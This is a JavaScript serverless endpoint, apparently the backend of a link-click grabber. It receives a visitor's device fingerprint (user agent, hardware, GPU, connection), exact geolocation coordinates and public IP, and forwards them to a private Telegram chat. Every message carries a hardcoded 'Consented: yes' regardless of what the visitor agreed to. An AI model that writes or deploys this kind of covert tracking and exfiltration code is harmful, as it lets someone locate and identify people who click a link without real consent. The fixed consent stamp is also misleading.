// /api/send.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ ok:false, error: 'Method not allowed' });
    return;
  }

  try {
    const body = req.body || {};
    // server-side IP (X-Forwarded-For preferível)
    const serverIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

    // monte a mensagem com formatação — cuidado com tamanho (Telegram tem limites)
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if(!token || !chatId){
      console.error('Missing TELEGRAM env vars');
      return res.status(500).json({ ok:false, error: 'telegram not configured' });
    }

    // Simplifique/escape strings para evitar problemas
    const esc = s => String(s || '').replaceAll('<','&lt;').replaceAll('>','&gt;');

    // Monta texto (Markdown)
    let text = `🔔 *Novo clique no botão*\n\n`;
    text += `🕒 _${new Date().toISOString()}_\n`;
    text += `🖥️ *UserAgent:* ${esc(body.userAgent)}\n`;
    text += `🌐 *Idioma:* ${esc(body.language)}\n`;
    text += `💻 *Plataforma:* ${esc(body.platform)}\n`;
    text += `📱 *Tela:* ${body.screen?.width || 'N/A'}x${body.screen?.height || 'N/A'}\n`;
    text += `🧠 *Memória (GB):* ${esc(body.deviceMemory)} • *CPU cores:* ${esc(body.hardwareConcurrency)}\n`;
    if(body.webgl?.renderer) text += `🎛️ *GPU:* ${esc(body.webgl.renderer)}\n`;
    if(body.connection) text += `📶 *Net:* ${esc(body.connection.effectiveType)} (${esc(body.connection.downlink)})\n`;
    if(body.geolocation){
      if(body.geolocation.error) text += `📍 *Geo:* permission:${esc(body.geolocation.error)}\n`;
      else text += `📍 *Geo:* ${body.geolocation.lat.toFixed(6)}, ${body.geolocation.lon.toFixed(6)} (acc ${body.geolocation.accuracy}m)\n`;
    }
    text += `🔎 *IP público (client):* ${esc(body.publicIp)}\n`;
    text += `🔒 *IP visto no servidor:* ${esc(serverIp)}\n`;
    text += `\n(Consented: yes)`;

    // chama Telegram API
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type':'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'Markdown'
      })
    });

    const j = await resp.json().catch(()=>({}));
    if(!resp.ok) {
      console.error('Telegram error', resp.status, j);
      return res.status(500).json({ ok:false, error:'telegram failed', details: j });
    }

    // opcional: retorno de id para salvar no client
    return res.json({ ok:true, id: j.result?.message_id || null });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok:false, error: String(err) });
  }
}
